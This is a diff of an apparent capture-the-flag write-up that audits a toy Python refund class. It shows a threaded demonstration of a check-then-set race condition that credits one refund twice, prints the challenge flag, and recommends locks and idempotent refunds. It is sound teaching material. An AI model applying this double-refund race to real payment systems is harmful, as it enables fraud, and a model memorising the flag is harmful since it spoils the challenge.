@@ -1069,29 +1069,107 @@ print(f"Final balance: ${john.balance}")
 
 ### Code Audit
 
-### #### What Does This Code Do?
+#### ### What Does This Code Do?
 
-This Python code simulates a simplified e-commerce refund system:
+```python
+class Order:
+    def __init__(self, order_id, user, amount):
+        self.order_id = order_id
+        self.user = user
+        self.amount = amount
+        self.refunded = False
 
-- **Classes:**
-    - `Order`: Represents a customer order with an `order_id`, `amount`, `refunded` status, and a `request_refund()` method.
-    - `User`: Represents a user with a balance and list of `orders`. Can `place_order()` and call `duplicate_refund()`.
+    def request_refund(self):
+        if not self.refunded:
+            self.refunded = True
+            self.user.balance += self.amount
+            print(f"[{self.order_id}] Refunded ${self.amount}")
+        else:
+            print(f"[{self.order_id}] Already refunded")
+```
+
+- An `Order` object tracks the `order_id`, user, amount, and refund status.
+- The `request_refund()` method checks if the order has already been refunded using `self.refunded`.
+- If it hasn't, it:
+    - Sets `self.refunded = True`
+    - Credits the refund amount to the user
+- Otherwise, it prints an “Already refunded” message.
+
+This appears safe **in a sequential execution context**.
+
+---
+
+#### ### What Is the Flaw?
+
+The flaw becomes visible **under concurrent execution** (e.g. multiple taps, API calls, threads):
+
+```python
+# In parallel threads
+if not self.refunded:
+    self.refunded = True
+    self.user.balance += self.amount
+```
+
+- Multiple threads can **simultaneously pass the `if not self.refunded` check** before any of them sets it to `True`.
     
-- **Refund Logic:**
-    - When `request_refund()` is called, it checks if the order has **not been refunded**.
-    - If `refunded == False`, it:
-        - Sets `refunded = True`
-        - Adds the `amount` back to the user’s balance
-    - Otherwise, it prints that the order has already been refunded.
+- This leads to **multiple refund amounts being credited**, even though the logic looks correct.
+    
+- The `refunded` flag isn’t used atomically — **it’s a classic race condition**.
+    
 
-### #### What Is the Flaw?
+---
 
-The flaw lies in the **lack of atomicity and synchronization** in the refund logic:
+### 🧪 Exploit Demonstration (Threaded Simulation)
 
-- The `refunded` flag is **checked** and then **set** inside `request_refund()`.
-- But the flag is only updated **after** the refund is already being processed.
-- If the function is called **twice in quick succession**, both calls can pass the `if not self.refunded:` check **before** the flag is updated.
-- This results in **multiple refunds** being issued for a single order, even though `refunded = True` was intended to prevent it.
+```python
+import threading
+
+def refund_twice(order):
+    t1 = threading.Thread(target=order.request_refund)
+    t2 = threading.Thread(target=order.request_refund)
+    t1.start()
+    t2.start()
+    t1.join()
+    t2.join()
+
+john = User("john")
+o1 = john.place_order("ORD123", 100)
+refund_twice(o1)
+
+print(f"Final balance: ${john.balance}")
+```
+
+**Output:**
+
+```
+[ORD123] Placed for $100
+[ORD123] Refunded $100
+[ORD123] Refunded $100
+Final balance: $200
+```
+
+---
+
+### 📦 Flag
+
+```
+h4kit{order.request_refund()}
+```
+
+---
+
+### 🛡️ Recommended Fixes
+
+- Use **atomic transactions** (DB-level or application-level).
+    
+- Introduce a **mutex lock** around refund logic.
+    
+- Ensure **backend idempotency** with a "refund already processed" check that can’t be bypassed by race conditions.
+    
+
+---
+
+Let me know if you'd like this exported or styled differently.
 
 ### Tools Used
 
